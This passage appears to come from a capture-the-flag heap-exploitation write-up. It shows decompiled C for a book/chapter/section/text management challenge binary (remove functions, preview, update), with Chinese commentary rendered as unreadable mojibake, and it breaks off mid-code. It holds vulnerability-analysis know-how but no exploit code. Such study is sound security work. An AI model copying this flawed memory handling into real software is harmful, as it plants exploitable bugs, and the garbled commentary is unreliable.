__int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>remove_text,é€šè¿‡sectionnameå®šä½sectionchunkï¼Œç„¶åfreeæ‰è¯¥sectionchunkä¸­çš„textchunkæŒ‡é’ˆæŒ‡å‘çš„chunkï¼Œç„¶åå°†æŒ‡é’ˆæ¸…é›¶</p><h4 id="5-remove-section"><a href="#5-remove-section" class="headerlink" title="5.remove_section()"></a>5.remove_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªåŒæ ·æ˜¯å…ˆè¾“å…¥sectionnameï¼Œå®šä½åˆ°sectionchunkï¼Œç„¶åå…ˆåˆ¤æ–­textchunkæŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯å°±å°†textchunk freeæ‰å¹¶å°†æŒ‡é’ˆæ¸…é›¶ï¼Œç„¶åfreeæ‰sectionchunk</p><h4 id="6-remove-chapter"><a href="#6-remove-chapter" class="headerlink" title="6.remove_chapter()"></a>6.remove_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>é€šè¿‡chapternameå®šä½åˆ°chapterchunkï¼Œç„¶åä¾æ¬¡å°†è¯¥chapterchunkä¸‹æ‰€æœ‰çš„textchunkï¼Œsectionchunk freeå¹¶æ¸…é›¶ï¼Œæœ€åå°†chapterchunk freeå¹¶æ¸…é›¶</p><h4 id="7-preview"><a href="#7-preview" class="headerlink" title="7.preview()"></a>7.preview()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">preview</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBook:%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n  Chapter:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n    Section:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      Text:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªåŠŸèƒ½å°±æ˜¯showåŠŸèƒ½ï¼Œä»bookchunkå¼€å§‹ï¼Œä¸€çº§ä¸€çº§çš„è¾“å‡ºæ‰€æœ‰chapterï¼Œsectionï¼Œtext</p><h4 id="8-update"><a href="#8-update" class="headerlink" title="8.update()"></a>8.update()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">update</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-124h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-120h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-11Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+138h] [rbp-8h]</span>  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhat to update?(Chapter/Section/Text):"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token 